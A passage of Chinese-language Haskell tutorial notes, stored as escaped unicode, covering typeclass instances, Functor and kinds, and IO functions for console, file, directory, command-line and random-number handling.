\u8fd9\u6837\u5c31\u53ef\u4ee5\u81ea\u5b9a\u4e49\u663e\u793a\u7684\u5185\u5bb9\uff0c\u5426\u5219\u4f7f\u7528 deriving \u7684\u8bdd\u53ea\u4f1a\u76f4\u63a5\u5c06\u5176\u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u3002 \u540c\u65f6\u4e5f\u8981\u6ce8\u610f\u7c7b\u578b\u548c\u7c7b\u578b\u6784\u9020\u5668\u7684\u533a\u522b\uff0c\u4f20\u5165\u7ed9 instance \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e94\u8be5\u4e3a\u7c7b\u578b\u800c\u4e0d\u662f\u7c7b\u578b\u6784\u9020\u5668\uff0c\u6bd4\u5982 Maybe\uff1a instance Eq Maybe where ... -- \u9519\u8bef\u7528\u6cd5\uff0c\u56e0\u4e3aMaybe\u662f\u7c7b\u578b\u6784\u9020\u5668\u800c\u4e0d\u662f\u7c7b\u578b instance Eq ( Maybe m ) where ... -- \u9519\u8bef\u7528\u6cd5\uff0c\u56e0\u4e3am\u4e0d\u4e00\u5b9a\u662fEq\u7684\u6210\u5458 instance ( Eq m ) => Eq ( Maybe m ) where Just x == Just y = x == y Nothing == Nothing = True _ == _ = False Functor Typeclass \u00b6 Functor \u4e5f\u662f\u4e00\u79cd\u7c7b\u578b\u7c7b\uff0c\u5b83\u53ea\u89c4\u5b9a\u4e86\u4e00\u4e2a\u51fd\u6570\uff1a class Functor f where fmap :: ( a -> b ) -> f a -> f b \u5176\u4e2d f \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b Kinds \u00b6 \u4e00\u4e2a\u503c\u7684\u7c7b\u578b\u53eb\u505a\u7c7b\u578b\uff08Type\uff09\uff0c\u800c\u4e00\u4e2a\u7c7b\u578b\u7684\u7c7b\u578b\u53eb\u505a Kind\u3002\u53ef\u4ee5\u901a\u8fc7 GHCi \u4e2d :k \u6765\u67e5\u770b Kind\uff1a ghci > : k Int Int :: * ghci > : k Maybe Maybe :: * -> * ghci > : k Maybe Int Maybe Int :: * ghci > : k Either Either :: * -> * -> * \u5176\u4e2d\u7684\u661f\u53f7 * \u4ee3\u8868\u4e86\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08concrete type\uff09\u3002Int \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Int \u7684 Kind \u662f *\u3002\u800c Maybe \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Maybe \u7684 Kind \u662f * -> *\u3002\u5982\u679c\u7ed9 Maybe \u4f20\u5165\u4e86\u4e00\u4e2a Int\uff0c\u90a3\u4e48\u5f97\u5230\u7684 Maybe Int \u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\uff0c\u5b83\u7684 Kind \u5c31\u662f *\u3002Either \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u4f46\u5b83\u63a5\u6536\u4e24\u4e2a\u7c7b\u578b\u624d\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\uff0c\u6240\u4ee5 Either \u7684 Kind \u662f * -> * -> *\u3002 Input/Output \u00b6 \u8fd0\u884c Haskell \u7a0b\u5e8f \u00b6 \u4e0d\u5728 GHCi \u4e2d\u8fd0\u884c\u4e00\u4e2a Haskell \u7a0b\u5e8f\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a \u7f16\u8bd1\u8fd0\u884c\uff1a $ ghc --make code $ ./code \u901a\u8fc7 runhaskell \u547d\u4ee4\u76f4\u63a5\u8fd0\u884c\uff1a $ runhaskell code.hs \u8f93\u51fa\u6587\u672c \u00b6 \u5728\u4e00\u4e2a Haskell \u7a0b\u5e8f\u4e2d\u8f93\u51fa\u6587\u5b57\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a main \u51fd\u6570\uff1a main = putStrLn \"Hello World\" \u5176\u4e2d putStrLn \u7684\u7c7b\u578b\u662f\uff1a putStrLn :: String -> IO () putStrLn \u63a5\u6536\u4e00\u4e2a String \u7c7b\u578b\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\u4e3a () \u7c7b\u578b\u7684 IO \u52a8\u4f5c\uff08I/O action\uff09\u3002\u6240\u4ee5 main \u51fd\u6570\u7684\u7c7b\u578b\u4e3a IO ()\u3002\uff08IO \u7684 Kind \u662f* -> *\uff09 \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u9ed8\u8ba4\u63d0\u4f9b\u7684\u8f93\u51fa\u6587\u672c\u7684\u51fd\u6570\uff1a putStr \uff1a\u8f93\u51fa\u6587\u672c\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c putChar \uff1a\u8f93\u51fa\u5355\u4e2a\u5b57\u7b26\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c\u3002\u63a5\u6536\u7684\u53c2\u6570\u4e3a\u5355\u4e2a Char\uff0c\u4e0d\u662f String\uff08\u7528\u5355\u5f15\u53f7\u4e0d\u662f\u53cc\u5f15\u53f7\uff09 print \uff1a\u53ef\u4ee5\u63a5\u6536\u4efb\u4f55 Show \u7684\u6210\u5458\uff0c\u5148\u7528 show \u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u7136\u540e\u8f93\u51fa\u3002\u7b49\u540c\u4e8e putStrLn . show do block \u00b6 \u5728 main \u51fd\u6570\u4e2d\u4f7f\u7528\u591a\u4e2a putStrLn \u9700\u8981\u4f7f\u7528 do \u8bed\u53e5\uff1a main = do putStrLn \"Line1\" putStrLn \"Line2\" \u5176\u4e2d\u6700\u540e\u4e00\u884c\u4e00\u5b9a\u8981\u8fd4\u56de IO () \u7c7b\u578b\u7684\u503c \u8f93\u5165\u6587\u672c \u00b6 \u8f93\u5165\u6587\u5b57\u9700\u8981\u5728 do \u5757\u4e2d\u4f7f\u7528 getLine\uff1a main = do line <- getLine putStrLn line getLine \u7684\u7c7b\u578b\u662f\uff1a getLine :: IO String \u800c <- \u64cd\u4f5c\u7b26\u5c06 getLine \u4e2d\u7684 String \u63d0\u53d6\u4e86\u51fa\u6765\u7ed9\u5230\u4e86 line\uff0c\u4f7f line \u53d8\u6210\u4e86 String \u7c7b\u578b\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32 \u800c\u4e14\u4f7f\u7528\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u8981\u7ecf\u8fc7\u4e00\u6b21 <-\uff0c\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 getLine \u4f5c\u4e3a\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a getLine \u4e0d\u662f String \u7c7b\u578b\uff0c\u800c\u662f IO String \u7c7b\u578b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 getChar \u6765\u83b7\u53d6\u5355\u4e2a\u5b57\u7b26\uff0c\u4f46\u4ecd\u7136\u9700\u8981\u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u6765\u63d0\u53d6 Char \u5176\u4ed6 IO \u76f8\u5173\u51fd\u6570\u7528\u6cd5 \u00b6 return \u00b6 Haskell \u4e2d\u7684 return \u548c\u5176\u4ed6\u547d\u4ee4\u5f0f\u8bed\u8a00\u4e2d\u7684 return \u5b8c\u5168\u4e0d\u540c\uff0c\u5b83\u4e0d\u4f1a\u4f7f\u51fd\u6570\u76f4\u63a5\u7ed3\u675f\u5e76\u8fd4\u56de\u4e00\u4e2a\u503c\u3002 main \u51fd\u6570\u5fc5\u987b\u5b9a\u4e49\u4e3a\u7c7b\u578b\u4e3a IO () \u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5728 main \u51fd\u6570\u4e2d\u4f7f\u7528 if \u8bed\u53e5\uff0c\u5982\u679c\u4e0d\u8f93\u51fa\u7684\u8bdd\u4e5f\u4e0d\u53ef\u4ee5\u76f4\u63a5\u653e\u4e0b\u4ec0\u4e48\u90fd\u4e0d\u5e72\uff0c\u56e0\u4e3a\u8fd9\u65f6\u5019 main \u51fd\u6570\u7684\u7c7b\u578b\u4e0d\u662f IO ()\u3002\u6240\u4ee5\u8fd9\u65f6\u9700\u8981\u4f7f\u7528 return () \u6765\u4e3a main \u51fd\u6570\u6307\u5b9a\u4e3a IO () \u7c7b\u578b\uff0c\u4f8b\u5982\uff1a main = do line <- getLine if null line then return () -- <-\u8fd9\u91cc else do ... \u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5c06 return \u8bed\u53e5\u4e2d\u7684\u5185\u5bb9\u63d0\u53d6\u51fa\u6765\uff0c\u6bd4\u5982 a <- return 'A'\uff0c\u6267\u884c\u540e a \u5c31\u662f 'A'\u3002 when \u00b6 when \u5305\u542b\u5728 Control.Monad \u6a21\u5757\u4e2d\uff0c\u5b83\u8868\u793a\u5728\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u6761\u4ef6\u4e0b\u4f1a\u6267\u884c\u7b2c\u4e8c\u4e2a\u51fd\u6570\uff0c\u5426\u5219\u4f1a return ()\u3002\u6bd4\u5982\uff1a import Control.Monad main = do c <- getChar when ( c /= ' ' ) $ do putChar c main \u7b49\u540c\u4e8e\uff1a main = do c <- getChar if c /= ' ' then do putChar c main else return () sequence \u00b6 sequence \u5728 IO \u4e2d\u4f7f\u7528\u65f6\u53ef\u4ee5\u8fbe\u6210 [IO a] -> IO [a] \u7684\u6548\u679c\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4f5c\uff1a [ a , b , c ] <- sequence [ getLine , getLine , getLine ] mapM & mapM_ \u00b6 \u5728 IO \u76f8\u5173\u7684\u5730\u65b9\u4f7f\u7528 map\uff0c\u53ef\u4ee5\u4f7f\u7528 mapM \u548c mapM_\uff0c\u5176\u4e2d mapM \u6709\u8fd4\u56de\u503c\u800c mapM_ \u76f4\u63a5\u6254\u6389\u4e86\u8fd4\u56de\u503c\uff1a ghci > mapM print [ 1 , 2 , 3 ] 1 2 3 [ () , () , () ] ghci > mapM_ print [ 1 , 2 , 3 ] 1 2 3 forever \u00b6 forever \u51fd\u6570\u5305\u542b\u5728 Control.Monad \u6a21\u5757\u4e2d\u3002\u5728 main \u51fd\u6570\u5f00\u5934\u52a0\u4e0a forever \u51fd\u6570\u53ef\u4ee5\u4f7f\u540e\u9762\u7684 do \u5757\u4e00\u76f4\u91cd\u590d\u6267\u884c\u76f4\u5230\u7a0b\u5e8f\u88ab\u8feb\u7ec8\u6b62\uff0c\u5982\uff1a import Control.Monad main = forever $ do ... forM \u00b6 forM \u51fd\u6570\u5305\u542b\u5728 Control.Monad \u6a21\u5757\u4e2d\uff0c\u5b83\u7684\u529f\u80fd\u548c mapM \u7c7b\u4f3c\uff0c\u4ece\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e2d\u9010\u4e2a\u53d6\u51fa\u5143\u7d20\u4f20\u5165\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u4e00\u4e2a\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\u7684\u51fd\u6570\uff09\u4e2d\uff0c\u5e76\u4e14\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u8fd4\u56de IO a \u7c7b\u578b\u3002\u6bd4\u5982\uff1a import Control.Monad main = do colors <- forM [ 1 , 2 , 3 , 4 ] ( \\ a -> do putStrLn $ \"Which color do you associate with the number \" ++ show a ++ \"?\" color <- getLine return color ) putStrLn \"The colors that you associate with 1, 2, 3 and 4 are: \" mapM putStrLn colors getContents \u00b6 getLine \u83b7\u53d6\u4e00\u6574\u884c\uff0c\u800c getContents \u4ece\u6807\u51c6\u8f93\u5165\u4e2d\u83b7\u53d6\u5168\u90e8\u5185\u5bb9\u76f4\u5230\u9047\u5230 EOF\uff0c\u5e76\u4e14\u5b83\u662f lazy \u7684\uff0c\u5728\u6267\u884c\u4e86 foo <- getContents \u540e\uff0c\u5b83\u5e76\u4e0d\u4f1a\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\u5e76\u4e14\u8d4b\u503c\u5230 foo\uff0c\u800c\u662f\u7b49\u5230\u9700\u8981\u4f7f\u7528 foo \u7684\u65f6\u5019\u518d\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\u3002 getContents \u5728\u4f7f\u7528\u7ba1\u9053\u4f20\u5165\u6587\u5b57\u65f6\u5f88\u5e38\u7528\uff0c\u53ef\u4ee5\u4ee3\u66ff forever+getLine \u4f7f\u7528\uff0c\u6bd4\u5982\u4e00\u4e2a Haskell \u7a0b\u5e8f\u6587\u4ef6 code.hs\uff1a import Data.Char main = do contents <- getContents putStr ( map toUpper contents ) \u4f7f\u7528 ghc --make code \u7f16\u8bd1\u540e\uff0c\u901a\u8fc7\u7ba1\u9053\u4f20\u5165\u6587\u5b57\uff1a cat text.txt | ./code \u4f1a\u5c06 text.txt \u4e2d\u7684\u6240\u6709\u5b57\u6bcd\u8f6c\u4e3a\u5927\u5199\u5e76\u8f93\u51fa interact \u00b6 \u4e0a\u8ff0\u529f\u80fd\u8fd8\u53ef\u4ee5\u8f6c\u5316\u4e3a\u4e00\u4e2a String -> String \u7684\u51fd\u6570\uff1a upperStrings = unlines . map ( map toUpper ) . lines \u800c\u5728 main \u4e2d\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u5c31\u9700\u8981\uff1a main = do contents <- getContents putStr ( upperStrings contents ) \u4f46\u662f String -> String \u7c7b\u578b\u7684\u51fd\u6570\u5728\u8f93\u5165\u8f93\u51fa\u4e2d\u7684\u4f7f\u7528\u592a\u5e38\u89c1\u4e86\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 interact \u51fd\u6570\u6765\u7b80\u5316\u3002interact \u7684\u7c7b\u578b\u662f\uff1a interact :: (String -> String) -> IO () \u53ef\u4ee5\u770b\u51fa\u5b83\u63a5\u6536\u4e00\u4e2a String -> String \u7684\u51fd\u6570\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a IO () \u7c7b\u578b\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528\u5728 main \u4e0a\u3002 \u4e8e\u662f\u6574\u4e2a\u8f6c\u6362\u4e3a\u5927\u5199\u7684\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u7b80\u5316\u4e3a\uff1a main = interact $ unlines . map ( map toUpper ) . lines \u6587\u4ef6\u548c\u6d41 \u00b6 \u4ee5\u4e0b\u4e0e\u6587\u4ef6\u548c\u6d41\u76f8\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 System.IO \u6a21\u5757\u4e2d openFile \u00b6 openFile \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a openFile :: FilePath -> IOMode -> IO Handle \u5176\u4e2d FilePath \u662f String \u7684 type synonyms\uff0c\u7528\u4e00\u4e2a\u5b57\u7b26\u4e32\u6765\u8868\u793a\u9700\u8981\u6253\u5f00\u7684\u6587\u4ef6\u7684\u8def\u5f84 IOMode \u7684\u5b9a\u4e49\u662f\uff1a data IOMode = ReadMode | WriteMode | AppendMode | ReadWriteMode \u6240\u4ee5\u5b83\u4e00\u5171\u53ea\u6709\u56db\u4e2a\u503c\uff0c\u7528\u6765\u8868\u793a\u8fdb\u884c IO \u64cd\u4f5c\u7684\u6a21\u5f0f openFile \u8fd4\u56de\u4e00\u4e2a IO Handle \u7c7b\u578b\u7684\u503c\uff0c\u5c06\u5176\u7528 <- \u64cd\u4f5c\u7b26\u63d0\u53d6\u540e\u4f1a\u51fa\u73b0\u4e00\u4e2a Handle \u7684\u503c\u3002\u4f46\u4e0d\u80fd\u4ece Handle \u4e2d\u76f4\u63a5\u4f7f\u7528\u6587\u5b57\uff0c\u8fd8\u9700\u8981\u4f7f\u7528\u4e00\u7cfb\u5217\u51fd\u6570\uff1a hGetContents :: Handle -> IO String \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u5168\u90e8\u5185\u5bb9\uff0c\u8fd4\u56de\u4e00\u4e2a IO String hGetChar :: Handle -> IO Char \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26 hGetLine :: Handle -> IO String \uff0c\u4ece Handle \u4e2d\u8bfb\u53d6\u4e00\u884c\uff0c\u8fd4\u56de\u4e00\u4e2a IO String hPutStr :: Handle -> String -> IO () \uff0c\u5411 Handle \u4e2d\u8f93\u51fa\u5b57\u7b26\u4e32 hPutStrLn :: Handle -> String -> IO () \uff0c\u540c\u4e0a \u5728\u4f7f\u7528 openFile \u8fdb\u884c\u6587\u4ef6\u64cd\u4f5c\u540e\uff0c\u9700\u8981\u4f7f\u7528 hClose \u624b\u52a8\u5173\u95ed Handle\u3002hClose :: Handle -> IO ()\uff0c\u63a5\u6536\u4e00\u4e2a Handle \u5e76\u8fd4\u56de IO ()\uff0c\u53ef\u4ee5\u76f4\u63a5\u653e\u5728 main \u51fd\u6570\u672b\u5c3e \u6240\u4ee5\u4f7f\u7528 openFile \u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u5168\u90e8\u5185\u5bb9\u5e76\u8f93\u51fa\u7684\u5168\u90e8\u4ee3\u7801\u662f\uff1a import System.IO main = do handle <- openFile \"text.txt\" ReadMode contents <- hGetContents handle putStrLn contents hClose handle withFile \u00b6 withFile \u7c7b\u4f3c Python \u4e2d\u7684 with open\uff0c\u5b83\u5728\u8bfb\u53d6\u6587\u4ef6\u4f7f\u7528\u4e4b\u540e\u4e0d\u9700\u8981\u624b\u52a8 close \u6587\u4ef6\u3002\u5b83\u7684\u7c7b\u578b\u662f\uff1a withFile :: FilePath -> IOMode -> (Handle -> IO a) -> IO a \u53ef\u4ee5\u770b\u51fa\uff0c\u5b83\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff1a FilePath \uff1a\u4e00\u4e2a\u8868\u793a\u6587\u4ef6\u8def\u5f84\u7684String IOMode \uff1a\u6253\u5f00\u6587\u4ef6\u7684\u6a21\u5f0f (Handle -> IO a) \uff1a\u4e00\u4e2a\u51fd\u6570\uff0c\u8868\u793a\u5bf9\u8bfb\u53d6\u6587\u4ef6\u540e\u7684Handle\u7d22\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u9700\u8981\u8fd4\u56de\u4e00\u4e2aI/O action\uff1b\u800c\u8fd9\u4e2a\u8fd4\u56de\u503c\u4e5f\u5c06\u4f5c\u4e3awithFile\u7684\u8fd4\u56de\u503c \u73b0\u5728\u4f7f\u7528 withFile \u6765\u6539\u5199\u4e0a\u8ff0\u4ee3\u7801\uff1a import System.IO main = withFile \"text.txt\" ReadMode ( \\ handle -> do contents <- hGetContents handle putStrLn contents ) withFile \u7684\u529f\u80fd\u76f8\u5f53\u4e8e\u4ee5\u4e0b\u51fd\u6570\uff1a withFile' :: FilePath -> IOMode -> ( Handle -> IO a ) -> IO a withFile' path mode f = do handle <- openFile path mode result <- f handle hClose handle return result readFile \u00b6 readFile \u53ef\u4ee5\u66f4\u52a0\u7b80\u5316\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u7684\u64cd\u4f5c\uff0c\u5b83\u7684\u7c7b\u578b\uff1a readFile :: FilePath -> IO String \u5b83\u53ea\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u8868\u793a\u6587\u4ef6\u8def\u5f84\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u5176\u4e2d\u4ee5\u5176\u4e2d\u5185\u5bb9\u4e3a\u5185\u5bb9\u7684 I/O action\uff1a import System.IO main = do contents <- readFile \"text.txt\" putStrLn contents writeFile \u00b6 writeFile \u7b80\u5316\u4e86\u5199\u5165\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u5b83\u7684\u7c7b\u578b\uff1a writeFile :: FilePath -> String -> IO () \u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u5199\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2aIO () appendFile \u00b6 appendFile \u7c7b\u4f3c writeFile\uff0c\u4f46\u4f7f\u7528\u5b83\u4e0d\u4f1a\u8986\u76d6\u6587\u4ef6\u4e2d\u539f\u6765\u5185\u5bb9\uff0c\u800c\u662f\u76f4\u63a5\u628a\u5b57\u7b26\u4e32\u6dfb\u52a0\u5230\u6587\u4ef6\u672b\u5c3e buffer \u00b6 \u6587\u4ef6\u4ee5\u6d41\u7684\u5f62\u5f0f\u88ab\u8bfb\u53d6\uff0c\u9ed8\u8ba4\u6587\u5b57\u6587\u4ef6\u7684\u7f13\u51b2\u533a\uff08buffer\uff09\u5927\u5c0f\u662f\u4e00\u884c\uff0c\u5373\u6bcf\u6b21\u8bfb\u53d6\u4e00\u884c\u5185\u5bb9\uff1b\u9ed8\u8ba4\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4ee5\u5757\u4e3a\u5355\u4f4d\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u5219\u6839\u636e\u7cfb\u7edf\u9ed8\u8ba4\u6765\u9009\u62e9\u3002 \u4e5f\u53ef\u4ee5\u901a\u8fc7 hSetBuffering \u51fd\u6570\u6765\u624b\u52a8\u8bbe\u7f6e\u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u7c7b\u578b\uff1a hSetBuffering :: Handle -> BufferMode -> IO () \u5b83\u63a5\u6536\u4e00\u4e2a handle\uff0c\u548c\u4e00\u4e2a BufferMode\uff0c\u5e76\u8fd4\u56de IO ()\u3002\u5176\u4e2d BufferMode \u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a NoBuffering \uff1a\u6ca1\u6709\u7f13\u51b2\u533a\uff0c\u4e00\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26 LineBuffering \uff1a\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4e00\u884c\uff0c\u5373\u6bcf\u6b21\u8bfb\u5165\u4e00\u884c\u5185\u5bb9 BlockBuffering (Maybe Int) \uff1a\u7f13\u51b2\u533a\u5927\u5c0f\u662f\u4e00\u5757\uff0c\u5757\u7684\u5927\u5c0f\u7531 Maybe Int \u6307\u5b9a\uff1a BlockBuffering (Nothing) \uff1a\u4f7f\u7528\u7cfb\u7edf\u9ed8\u8ba4\u7684\u5757\u5927\u5c0f BlockBuffering (Just 2048) \uff1a\u4e00\u5757\u7684\u5927\u5c0f\u662f 2048 \u5b57\u8282\uff0c\u5373\u6bcf\u6b21\u8bfb\u5165 2048 bytes \u7684\u5185\u5bb9 \u7f13\u51b2\u533a\u7684\u5237\u65b0\u662f\u81ea\u52a8\u7684\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 hFlush \u6765\u624b\u52a8\u5237\u65b0 hFlush :: Handle -> IO () \u4f20\u5165\u4e00\u4e2a handle\uff0c\u8fd4\u56de IO ()\uff0c\u5373\u5237\u65b0\u5bf9\u5e94 handle \u7684\u7f13\u51b2\u533a openTempFile \u00b6 openTempFile \u53ef\u4ee5\u65b0\u5efa\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6\uff1a openTempFile :: FilePath -> String -> IO (FilePath, Handle) FilePath \u6307\u4e34\u65f6\u6587\u4ef6\u8981\u521b\u5efa\u7684\u4f4d\u7f6e\u8def\u5f84\uff0c String \u6307\u4e34\u65f6\u6587\u4ef6\u540d\u5b57\u7684\u524d\u7f00\uff0c\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5176\u5185\u5bb9\u7b2c\u4e00\u4e2a FilePath \u662f\u521b\u5efa\u5f97\u5230\u7684\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84\uff0c Handle \u662f\u4e34\u65f6\u6587\u4ef6\u7684 handle \u4f8b\u5982\uff1a import System.IO main = do ( tempFile , tempHandle ) <- openTempFile \".\" \"temp\" ... hClose tempHandle \".\" \u6307\u4e34\u65f6\u6587\u4ef6\u8981\u5728\u5f53\u524d\u76ee\u5f55\u521b\u5efa\uff0c \"temp\" \u6307\u4e34\u65f6\u6587\u4ef6\u540d\u5b57\u4ee5 temp \u5f00\u5934\u3002\u6700\u7ec8\u5f97\u5230\u7684 tempFile \u5c31\u662f ./temp.......\uff0ctemp \u540e\u4e3a\u968f\u673a\u6570\u5b57\uff0c\u5982 ./temp43620-0 \u8def\u5f84\u64cd\u4f5c \u00b6 \u76f8\u5173\u51fd\u6570\u90fd\u5305\u542b\u5728 System.Directory \u6a21\u5757\u4e2d\uff0c\u5168\u90e8\u5185\u5bb9\u89c1 System.Directory getCurrentDirectory \u00b6 getCurrentDirectory :: IO FilePath \u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5176\u5185\u5bb9\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u8868\u793a\u5f53\u524d\u8def\u5f84\u7684\u7edd\u5bf9\u8def\u5f84 removeFile \u00b6 removeFile :: FilePath -> IO () \u8f93\u5165\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\uff0c\u5e76\u5220\u9664\u6389\u5b83 renameFile \u00b6 renameFile :: FilePath -> FilePath -> IO () \u8f93\u5165\u4e00\u4e2a\u539f\u8def\u5f84\uff0c\u4e00\u4e2a\u65b0\u8def\u5f84\uff0c\u4e3a\u539f\u8def\u5f84\u7684\u6587\u4ef6\u91cd\u547d\u540d\u4e3a\u65b0\u8def\u5f84\u7684\u540d doesFileExist \u00b6 doesFileExist :: FilePath -> IO Bool \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u5e03\u5c14\u503c\u7684 I/O action Command line arguments \u00b6 System.Environment \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570\u53ef\u4ee5\u7528\u6765\u5904\u7406\u4f20\u5165\u547d\u4ee4\u884c\u7684\u53c2\u6570 getArgs \u00b6 getArgs :: IO [String] \u4e0d\u9700\u8981\u8f93\u5165\u53c2\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a I/O action\uff0c\u5185\u5bb9\u4e3a\u4f20\u5165\u547d\u4ee4\u884c\u7684\u53c2\u6570\uff08\u4e00\u4e2a\u7531String\u7ec4\u6210\u7684\u5217\u8868\uff09\u3002\u76f8\u5f53\u4e8e C \u8bed\u8a00\u4e2d\u7684 argv[1:] getProgName \u00b6 getProgName :: IO String \u8fd4\u56de I/O action\uff0c\u5185\u5bb9\u4e3a\u7a0b\u5e8f\u7684\u540d\u5b57\uff0c\u76f8\u5f53\u4e8e C \u8bed\u8a00\u4e2d\u7684 argv[0] Randomness \u00b6 \u548c\u968f\u673a\u6570\u6709\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 System.Random \u6a21\u5757\u4e2d\u3002GHCi \u542f\u52a8\u65f6\u53ef\u80fd\u4e0d\u4f1a\u5305\u542b System.Random \u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u65e0\u6cd5\u627e\u5230\u6a21\u5757\u3002\u9700\u8981\u901a\u8fc7 stack \u6253\u5f00: stack ghci --package random Haskell \u8981\u6c42\u540c\u6837\u7684\u7a0b\u5e8f\u9700\u8981\u8fd0\u884c\u51fa\u540c\u6837\u7684\u7ed3\u679c\uff0c\u9664\u4e86\u7528\u5230\u4e86 I/O action\uff0c\u6240\u6709\u4f1a\u9020\u6210\u4e0d\u540c\u7ed3\u679c\u7684\u51fd\u6570\u90fd\u8981\u4ea4\u7ed9 I/O action \u6765\u5b8c\u6210 \u90a3\u8981\u4f7f\u968f\u673a\u6570\u8131\u79bb IO \u5b58\u5728\uff0c\u5c31\u8981\u7528\u5230\u968f\u673a\u751f\u6210\u5668\uff08random generator\uff09 System.Random \u6a21\u5757\u63d0\u4f9b\u4e86\u51e0\u4e2a\u751f\u6210\u968f\u673a\u6570\u7684\u51fd\u6570\uff1a random \u00b6 random :: (Random a, RandomGen g) => g -> (a, g) \u5176\u4e2d\u53c8\u6709\u4e24\u4e2a\u65b0\u7684 typeclass\uff0cRandom \u8868\u793a\u53ef\u4ee5\u53d6\u968f\u673a\uff0cRandomGen \u8868\u793a\u968f\u673a\u6570\u751f\u6210\u5668\u3002random \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u751f\u6210\u7684\u968f\u673a\u6570\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f\u4e00\u4e2a\u65b0\u7684\u968f\u673a\u6570\u751f\u6210\u5668 \u83b7\u53d6\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u4ee5\u4f7f\u7528 mkStdGen \u51fd\u6570\uff1a mkStdGen :: Int -> StdGen 